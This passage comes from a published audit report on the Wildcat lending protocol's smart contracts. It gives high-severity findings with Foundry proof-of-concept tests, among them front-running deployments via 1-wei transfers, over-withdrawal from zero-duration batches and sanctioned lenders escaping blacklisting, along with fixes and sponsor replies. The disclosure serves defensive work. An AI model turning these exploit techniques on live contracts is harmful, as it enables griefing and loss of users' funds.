            address(0),
            "_",
            "_"
        );

        // Dueet front-runs Aiken and transfers 1 wei to market address
        string memory namePrefix = "Market Token";
        string memory symbolPrefix = "MKT";
        address marketAddress = controller.computeMarketAddress(
            address(asset), 
            namePrefix, 
            symbolPrefix
        );
        payable(marketAddress).transfer(1);

        // Codehash of market address is now keccak256("")
        assertEq(marketAddress.codehash, keccak256(""));

        // Aiken calls deployMarket(), but it reverts due to non-zero codehash
        vm.prank(AIKEN);
        vm.expectRevert(MarketAlreadyDeployed.selector);
        controller.deployMarket(
            address(asset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
    }

    function test_CanSkipEscrowDeployment() public {
        // Deploy WildcatMarketController and WildcatMarket for Aiken
        (WildcatMarketController controller, WildcatMarket market) = _deployControllerAndMarket(
            AIKEN,
            address(asset),
            "Market Token",
            "MKT"
        );

        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Dueet becomes sanctioned
        vm.mockCall(
            MOCK_CHAINALYSIS_ADDRESS,
            abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),
            abi.encode(true)
        );

        // Attacker transfers 1 wei to Dueet's escrow address
        // Note: Borrower and lender addresses are swapped due to a separate bug
        address escrowAddress = sentinel.getEscrowAddress(DUEET, AIKEN, address(market));
        payable(escrowAddress).transfer(1);

        // Codehash of market address is now keccak256("")
        assertEq(escrowAddress.codehash, keccak256(""));

        // Dueet gets blocked in market
        market.nukeFromOrbit(DUEET);

        // Dueet's MKT tokens are transferred to his escrow address
        assertEq(market.balanceOf(escrowAddress), 1000e18);

        // However, the escrow contract was not deployed
        assertEq(escrowAddress.code.length, 0); 
    }

    function _deployControllerAndMarket(
        address user, 
        address _asset,
        string memory namePrefix, 
        string memory symbolPrefix
    ) internal returns (WildcatMarketController, WildcatMarket){
        vm.prank(user);
        (address controller, address market) = controllerFactory.deployControllerAndMarket(
            namePrefix,
            symbolPrefix,
            _asset,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        return (WildcatMarketController(controller), WildcatMarket(market));
    }
}
```
</details>

### Recommended Mitigation

Consider checking if the codehash of an address is not `keccak256("")` as well:

[WildcatMarketControllerFactory.sol#L294-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L294-L296)

```diff
-   if (controller.codehash != bytes32(0)) {
+   if (controller.codehash != bytes32(0) && controller.codehash != keccak256("")) {
      revert ControllerAlreadyDeployed();
    }
```

[WildcatMarketController.sol#L351-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L351-L353)

```diff
-   if (market.codehash != bytes32(0)) {
+   if (market.codehash != bytes32(0) && market.codehash != keccak256("")) {
      revert MarketAlreadyDeployed();
    }
```

[WildcatSanctionsSentinel.sol#L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L106)

```diff
-   if (escrowContract.codehash != bytes32(0)) return escrowContract;
+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256("") return escrowContract;
```

Alternatively, use `<address>.code.length != 0` to check if an address has code instead.

### Assessed type

Invalid Validation

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491#issuecomment-1803374083):**
 > Fix for this is easier than suggested - just change from `x.codehash != bytes32(0)` to `x.code.length != 0`.
> 
> Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/3b33a2f46b14079d3eb3b7429394b9e37c7fce03) and [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/fcbf50c9dae18b51d7ec5acf556ab2fc0f8a834f).
>
 > I'd emphasise here, however, that this is only a High Risk finding in the escrow situation - the others are grieving attacks that cause nothing to be "lost". Still a valuable finding, mind.

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491#issuecomment-1810754722)**

***

## [[H-03] Borrower has no way to update `maxTotalSupply` of `market` or close market.](https://github.com/code-423n4/2023-10-wildcat-findings/issues/431)
*Submitted by [0xpiken](https://github.com/code-423n4/2023-10-wildcat-findings/issues/431), also found by [Aymen0909](https://github.com/code-423n4/2023-10-wildcat-findings/issues/541), [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/495), [Fulum](https://github.com/code-423n4/2023-10-wildcat-findings/issues/458), [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/167), [max10afternoon](https://github.com/code-423n4/2023-10-wildcat-findings/issues/166), [tallo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/147), [Drynooo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/120), [cartlex\_](https://github.com/code-423n4/2023-10-wildcat-findings/issues/730), [HALITUS](https://github.com/code-423n4/2023-10-wildcat-findings/issues/727), gumgumzum ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/694), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/370)), [CaeraDenoir](https://github.com/code-423n4/2023-10-wildcat-findings/issues/645), [serial-coder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/639), [stackachu](https://github.com/code-423n4/2023-10-wildcat-findings/issues/627), [0xkazim](https://github.com/code-423n4/2023-10-wildcat-findings/issues/620), [josephdara](https://github.com/code-423n4/2023-10-wildcat-findings/issues/617), [Toshii](https://github.com/code-423n4/2023-10-wildcat-findings/issues/609), DeFiHackLabs ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/600), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/574)), SpicyMeatball ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/569), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/535)), ZdravkoHr ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/563), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/334)), [nirlin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/545), [radev\_sw](https://github.com/code-423n4/2023-10-wildcat-findings/issues/542), [TuringConsulting](https://github.com/code-423n4/2023-10-wildcat-findings/issues/528), [nonseodion](https://github.com/code-423n4/2023-10-wildcat-findings/issues/527), [Yanchuan](https://github.com/code-423n4/2023-10-wildcat-findings/issues/525), hash ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/522), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/401)), [erictee](https://github.com/code-423n4/2023-10-wildcat-findings/issues/509), [jasonxiale](https://github.com/code-423n4/2023-10-wildcat-findings/issues/488), [\_nd\_koo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/485), [0xhegel](https://github.com/code-423n4/2023-10-wildcat-findings/issues/478), [gizzy](https://github.com/code-423n4/2023-10-wildcat-findings/issues/466), [sl1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/442), QiuhaoLi ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/439), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/436)), [trachev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/420), [smiling\_heretic](https://github.com/code-423n4/2023-10-wildcat-findings/issues/419), [crunch](https://github.com/code-423n4/2023-10-wildcat-findings/issues/417), [LokiThe5th](https://github.com/code-423n4/2023-10-wildcat-findings/issues/413), [said](https://github.com/code-423n4/2023-10-wildcat-findings/issues/408), [lanrebayode77](https://github.com/code-423n4/2023-10-wildcat-findings/issues/394), [circlelooper](https://github.com/code-423n4/2023-10-wildcat-findings/issues/388), [SovaSlava](https://github.com/code-423n4/2023-10-wildcat-findings/issues/379), [osmanozdemir1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/373), [Mike\_Bello90](https://github.com/code-423n4/2023-10-wildcat-findings/issues/371), [TrungOre](https://github.com/code-423n4/2023-10-wildcat-findings/issues/354), [Silvermist](https://github.com/code-423n4/2023-10-wildcat-findings/issues/329), Vagner ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/314), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/304)), [kodyvim](https://github.com/code-423n4/2023-10-wildcat-findings/issues/310), [deth](https://github.com/code-423n4/2023-10-wildcat-findings/issues/300), ke1caM ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/294), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/292)), [Jiamin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/287), 0xStalin ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/285), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/280)), [almurhasan](https://github.com/code-423n4/2023-10-wildcat-findings/issues/284), [peter](https://github.com/code-423n4/2023-10-wildcat-findings/issues/281), [audityourcontracts](https://github.com/code-423n4/2023-10-wildcat-findings/issues/256), [ggg\_ttt\_hhh](https://github.com/code-423n4/2023-10-wildcat-findings/issues/217), [AM](https://github.com/code-423n4/2023-10-wildcat-findings/issues/210), Eigenvectors ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/201), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/200)), [3docSec](https://github.com/code-423n4/2023-10-wildcat-findings/issues/195), [Juntao](https://github.com/code-423n4/2023-10-wildcat-findings/issues/186), marqymarq10 ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/162), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/159)), 0xComfyCat ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/151), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/150)), rvierdiiev ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/134), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/129)), [ayden](https://github.com/code-423n4/2023-10-wildcat-findings/issues/118), [squeaky\_cactus](https://github.com/code-423n4/2023-10-wildcat-findings/issues/103), [cu5t0mpeo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/91), [zaevlad](https://github.com/code-423n4/2023-10-wildcat-findings/issues/69), [HChang26](https://github.com/code-423n4/2023-10-wildcat-findings/issues/60), and T1MOH ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/35), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/34))*

Without the ability to update `maxTotalSupply`, `borrower` has no way to raise more assets in a specific market. Even worse, `borrower` has to pay extra interest for unused assets all the time because `borrower` has no way to reduce the max total supply of the market.

Similarly, `borrower` has to pay extra interest to the no-longer-used market all the time because there is no way to close it.

### Proof of Concept

There are access controls on functions [`setMaxTotalSupply()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L134-L144) and [`closeMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L142-L161), and only `WildcatMarketController` is allowed to access them; however, there is not a function in `WildcatMarketController` allowing the `borrower` to access them.

### Recommended Mitigation Steps

Add `setMaxTotalSupply()` and `closeMarket()` in [`WildcatMarketController`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol) to allow the `borrower` access these functions:

```solidity
  function setMaxTotalSupply(address market, uint256 _maxTotalSupply) external onlyBorrower {
    WildcatMarket(market).setMaxTotalSupply(_maxTotalSupply);
  }
  function closeMarket(address market) external onlyBorrower {
    WildcatMarket(market).closeMarket();
  }
```

### Assessed type

Access Control

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/431#issuecomment-1803372151):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/c32d6ad80776917673bbf7c5b61e3488c53f7210) and [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/2b8a3e08644305cc169439f1bcf2c1795d6f1975).
>
 > Lodging a protest against the High Risk decision, however:
> 
> - Markets could still *effectively* be closed by all lenders redeeming their market tokens; the borrower handling these repayments ad hoc and the borrower removing all lenders from the appropriate controller to prevent future deposits. No funds are at risk here.
> - The inability to increase or decrease the capacity from the controller - which can lead to more interest accruing to a lender that refuses to withdraw - is not a matter of funds being "lost" but rather a grieving.
> 
> In either case, assets are *not* at direct risk *while in the market*: the definition of High Risk as given by the label is "assets can be stolen/lost/compromised directly".
> 
> This does not apply here. It's certainly a Medium; however, and a valuable finding in and of itself.


**[0xTheC0der (judge) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/431#issuecomment-1804284590):**
 > I partially agree with the sponsor. However, if the protocol was deployed with this bug, it would lack 2 core functionalities.
> 
> A protocol being fully functional as intended, which is crucial to attract and keep customers/users with funds in the long term, can be considered a valuable asset itself.
>
> Although Medium severity is predestined for this category of findings which impede the function of a protocol, High severity seems justified given the impact.  
> 
> The following might further clarify my reasoning:  
> - Please also consider that not all findings that lead to lost or stolen funds will strictly yield a High severity finding, since it depends on the amount of funds at risk.  
> - In contrast, not every impeded functionality will only yield Medium severity.  

**[laurenceday (Wildcat) confirmed and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/431#issuecomment-1810753921):**
 > Fair enough - not going to throw toys out of the pram over semantics. Appreciate the feedback!

***

## [[H-04] When `withdrawalBatchDuration` is set to zero lenders can withdraw more then allocated to a batch](https://github.com/code-423n4/2023-10-wildcat-findings/issues/410)
*Submitted by [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/410)*

### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketWithdrawals.sol#L137><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketWithdrawals.sol#L77>

### Vulnerability details

The Wildcat protocol utilizes a withdrawal cycle where lenders call   `queueWithdrawals` which then goes through a set amount of time (withdrawal duration period) before a withdrawal can be executed (if the protocol has enough funds to cover the withdrawal). Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.

The `withdrawalBatchDuration` can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.

A lender calls `queueWithdrawal` first to initiate the withdrawal; this will place it in a batch respective to its expiry:

```solidity
function queueWithdrawal(uint256 amount) external nonReentrant {
        MarketState memory state = _getUpdatedState();

        ...

        // If there is no pending withdrawal batch, create a new one.
        if (state.pendingWithdrawalExpiry == 0) {
            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);
            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);
        }
        // Cache batch expiry on the stack for gas savings.
        uint32 expiry = state.pendingWithdrawalExpiry;

        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];

        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.
        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;
        batch.scaledTotalAmount += scaledAmount;
        state.scaledPendingWithdrawals += scaledAmount;

        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);

        // Burn as much of the withdrawal batch as possible with available liquidity.
        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());
        if (availableLiquidity > 0) {
            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);
        }

        // Update stored batch data
        _withdrawalData.batches[expiry] = batch;

        // Update stored state
        _writeState(state);
    }
```

Now once the `withdrawalBatchDuration` has passed, a lender can call `executeWithdrawal` to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.

```solidity
function executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {
        if (expiry > block.timestamp) {
            revert WithdrawalBatchNotExpired();
        }
        MarketState memory state = _getUpdatedState();

        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];
        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];

        uint128 newTotalWithdrawn =
            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));
        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;
        status.normalizedAmountWithdrawn = newTotalWithdrawn;
        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;

        ...

        // Update stored state
        _writeState(state);

        return normalizedAmountWithdrawn;
    }
```

Let's look at how this percentage is determined: the `newTotalWithdrawn` function determines a lender's available withdrawal amount by multiplying the `normalizedAmountPaid` with the `scaledAmount` and dividing the result by the batch's `scaledTotalAmount`. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their `scaledAmount`.

```solidity
 uint128 newTotalWithdrawn =
            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));
```

This works fine when `withdrawalBatchDuration` is set over zero, as the batch values (except `normalizedAmountPaid`) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than `normalizedAmountPaid` in that batch, potentially violating protocol invariants.

Consider the following scenario:

There is only 5 tokens available to burn.

Lender A calls `queueWithdrawal` with 5 and `executeWithdrawal` instantly.

    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount

    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5

Lender A was able to fully withdraw.

Lender B comes along and calls `queueWithdrawal` with 5 and `executeWithdrawal` instantly in the same block. This will add to the same batch as lender A as it is the same expiry.

Now let's look at `newTotalWithdrawn` for Lender B:

    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount

    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5

Lets see what the batch looks like now:

- Lender A was able to withdraw 5 tokens in the batch.
- Lender B was able to withdraw 2.5 tokens in the batch.
- The `batch.normalizedAmountPaid` is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.

### Impact

This will break the following invariant in the protocol:

> "Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets."

It will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's `normalizedAmountPaid` number shows that it should be able to.

### Proof Of Concept

For the following test, make sure you use the following parameters in `ExpectedStateTracker`:

```solidity
MarketParameters internal parameters = MarketParameters({
        asset: address(0),
        namePrefix: "Wildcat ",
        symbolPrefix: "WC",
        borrower: borrower,
        controller: address(0),
        feeRecipient: address(0),
        sentinel: address(sanctionsSentinel),
        maxTotalSupply: uint128(DefaultMaximumSupply),
        protocolFeeBips: 0,
        annualInterestBips: 0,
        delinquencyFeeBips: DefaultDelinquencyFee,
        withdrawalBatchDuration: 0,
        reserveRatioBips: DefaultReserveRatio,
        delinquencyGracePeriod: DefaultGracePeriod
    });
```

```solidity
function test_ZeroWithdrawalDuration() external asAccount(address(controller)) {
        assertEq(market.withdrawalBatchDuration(), 0);
        // alice deposit
        _deposit(alice, 2e18);
        // bob deposit
        _deposit(bob, 1e18);
        // borrow 33% of deposits
        _borrow(1e18);
        // alice withdraw request
        startPrank(alice);
        market.queueWithdrawal(1e18);
        stopPrank();
        // fast forward 1 days
        fastForward(1 days);
        // alice withdraw request
        startPrank(alice);
        market.queueWithdrawal(1e18);
        stopPrank();
        // lets look at the withdrawal batch
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid, 1e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount, 1e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned, 1e18);
        // check amount alice has withdrawn so far (should be zero)
        assertEq(
            market.getAccountWithdrawalStatus(address(alice), uint32(block.timestamp)).normalizedAmountWithdrawn, 0
        );
        // alice withdraw
        startPrank(alice);
        market.executeWithdrawal(address(alice), uint32(block.timestamp));
        stopPrank();
        // check amount alice has withdrawn so far (should be 1e18)
        assertEq(
            market.getAccountWithdrawalStatus(address(alice), uint32(block.timestamp)).normalizedAmountWithdrawn, 1e18
        );
        // bob withdraw request in same batch
        startPrank(bob);
        market.queueWithdrawal(1e18);
        stopPrank();
        // lets look at the withdrawal batch now
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid, 1e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount, 2e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned, 1e18);
        // check amount bob has withdrawn so far (should be zero)
        assertEq(market.getAccountWithdrawalStatus(address(bob), uint32(block.timestamp)).normalizedAmountWithdrawn, 0);
        // bob withdraw
        startPrank(bob);
        market.executeWithdrawal(address(bob), uint32(block.timestamp));
        stopPrank();
        // check amount bob has withdrawn so far (should be 5e17)
        assertEq(
            market.getAccountWithdrawalStatus(address(bob), uint32(block.timestamp)).normalizedAmountWithdrawn, 5e17
        );
        // lets look at the withdrawal batch now
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid, 1e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount, 2e18);
        assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned, 1e18);
        // what happened is alice and bob have withdrawn 1e18 and 5e17 respectively
        // but the batch is 1e18
        uint128 normalizedAmountPaid = market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid;
        uint128 aliceWithdrawn =
            market.getAccountWithdrawalStatus(address(alice), uint32(block.timestamp)).normalizedAmountWithdrawn;
        uint128 bobWithdrawn =
            market.getAccountWithdrawalStatus(address(bob), uint32(block.timestamp)).normalizedAmountWithdrawn;
        assertGt(aliceWithdrawn + bobWithdrawn, normalizedAmountPaid);
    }
```

### Tools Used

Foundry

### Recommendation

Review the protocol's withdrawal mechanism and consider adjusting the behaviour of withdrawals when `withdrawalBatchDuration` is set to zero to ensure that lenders cannot withdraw more than their pro-rata share of the batch's paid assets.

**[d1ll0n (Wildcat) confirmed and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/410#issuecomment-1789235997):**
 > Thank you! Good catch - going to fix this by changing the assertion in `executeWithdrawal` from:
> ```solidity
> if (expiry > block.timestamp) {
>     revert WithdrawalBatchNotExpired();
> }
> ```
>     
> to:
>     
> ```solidity
> if (expiry >= block.timestamp) {
>       revert WithdrawalBatchNotExpired();
> }
> ```
>     
> so that it's guaranteed the withdrawal batch can not be added to when it's in a state that allows execution.

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/410#issuecomment-1803369074):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/f9ecf3df04a6c9608faeae76f2c40d61716e9061).

***

## [[H-05] Lenders can escape the blacklisting of their accounts because they can move their MarketTokens to different accounts and gain the `WithdrawOnly` Role on any account they want](https://github.com/code-423n4/2023-10-wildcat-findings/issues/266)
*Submitted by [0xStalin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/266), also found by [elprofesor](https://github.com/code-423n4/2023-10-wildcat-findings/issues/670), [Infect3d](https://github.com/code-423n4/2023-10-wildcat-findings/issues/647), [serial-coder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/624), [xeros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/621), [radev\_sw](https://github.com/code-423n4/2023-10-wildcat-findings/issues/532), [jasonxiale](https://github.com/code-423n4/2023-10-wildcat-findings/issues/518), [ast3ros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/516), [QiuhaoLi](https://github.com/code-423n4/2023-10-wildcat-findings/issues/472), [Fulum](https://github.com/code-423n4/2023-10-wildcat-findings/issues/460), TrungOre ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/411), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/356)), SandNallani ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/405), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/400)), [SovaSlava](https://github.com/code-423n4/2023-10-wildcat-findings/issues/380), [kodyvim](https://github.com/code-423n4/2023-10-wildcat-findings/issues/313), [0xbepresent](https://github.com/code-423n4/2023-10-wildcat-findings/issues/238), [Eigenvectors](https://github.com/code-423n4/2023-10-wildcat-findings/issues/204), [3docSec](https://github.com/code-423n4/2023-10-wildcat-findings/issues/191), [marqymarq10](https://github.com/code-423n4/2023-10-wildcat-findings/issues/158), [ayden](https://github.com/code-423n4/2023-10-wildcat-findings/issues/122), [HChang26](https://github.com/code-423n4/2023-10-wildcat-findings/issues/116), cu5t0mpeo ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/94), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/88)), 0xCiphky ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/81), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/80)), rvierdiiev ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/73), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/63)), [nobody2018](https://github.com/code-423n4/2023-10-wildcat-findings/issues/54), [YusSecurity](https://github.com/code-423n4/2023-10-wildcat-findings/issues/540), [gizzy](https://github.com/code-423n4/2023-10-wildcat-findings/issues/447), [nisedo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/257), [bdmcbri](https://github.com/code-423n4/2023-10-wildcat-findings/issues/255), [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/236), [0xComfyCat](https://github.com/code-423n4/2023-10-wildcat-findings/issues/155), and [max10afternoon](https://github.com/code-423n4/2023-10-wildcat-findings/issues/146)*

Lenders can escape the sanctioning of their account in any market.

### Proof of Concept

Before diving into the details of how the lenders can escape the sanctioning of their account, first, let's analyze how a lender can be excised from a Market:
- When someone calls `nukeFromOrbit` within that market while flagged as sanctioned by the Chainanalysis oracle.
- When the lender invokes `executeWithdrawal` while flagged as sanctioned by the Chainalysis oracle

In either of the two options, the execution flow calls the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) to verify if the account(lender) is sanctioned by the borrower of the market
- By analyzing the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43), it can be noted that the lender's account must have been sanctioned in the Oracle first before the account is finally sanction in a Market.

**WildcatSanctionsSentinel.sol**

```solidity
  function isSanctioned(address borrower, address account) public view override returns (bool) {
    //@audit-info => sanctionOverrides[borrower][account] must be false <==> sanction must not be overridden for this function to return true!
    //@audit-info => If sanctionOverrides[borrower][account] is set to true, this function will return false, as if the account would not be sanctioned

    //@audit-info => For this function to return true, the account's sanction should have not been overridden (it's set to false), and the account must have been sanctioned in the ChainalysisSanctionsList Oracle.
    return
      !sanctionOverrides[borrower][account] &&
      IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);
  }
```

Now, based on the previous explanation, we know that the lender's account needs to be sanctioned in the Chainalysis Oracle before the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) is called.

This opens up the doors for lenders who realize that their account has been sanctioned in the Chainalysis Oracle to move their MarketTokens to different accounts before the lender's account is fully blocked in the Market. You may be wondering what's the point of transferring tokens to accounts that have not been granted any role in the Market, I'll explain more about this shortly.

The lender transfers their MarketTokens to different accounts using the [`WildcatMarketToken::transfer()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L36-L39). As a result, the lender's account that is sanctioned in the Chainalysis Oracle has no MarketTokens anymore; all those tokens have been moved to other accounts.

Now, at this point, anybody could call the `nukeFromOrbit()` function to fully sanction the lender's account in a specific Market. Ether way, the Lender has already moved their tokens to other accounts.

At this point, the lender's MarketTokens were distributed among different accounts of their own. Such accounts have never interacted with the Market, so their current role is the `Null` Role.

Everything might look fine because the accounts where the tokens were sent have no permissions to interact with the Market, but there is a bug that allows lenders to gain the `WithdrawOnly` Role on any account they want, without having the consent of the borrower.

This problem is located in the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190). The reason of this problem will be explained in the below code walkthrough:

In short, the Lender will be able to set the `WithdrawOnly` Role to any account they wish. The reason is that any account that is not registered in the `_authorizedLenders` variable of the Controller will forward the value of `_isAuthorized` as false. In the [`WildMarketConfig::updateAccountAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L112-L126), because the value of `_isAuthorized` is false, it will end up granting the `WithdrawOnly` Role. This effectively allows any Lender to grant the `WithdrawOnly` Role to any account they want to.

**WildcatMarketController.sol**

```solidity
  //@audit-info => Anybody can call this function and pass a lender and an array of markets where the changes will be applied!
  function updateLenderAuthorization(address lender, address[] memory markets) external {
    for (uint256 i; i < markets.length; i++) {
      address market = markets[i];
      if (!_controlledMarkets.contains(market)) {
        revert NotControlledMarket();
      }
      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly
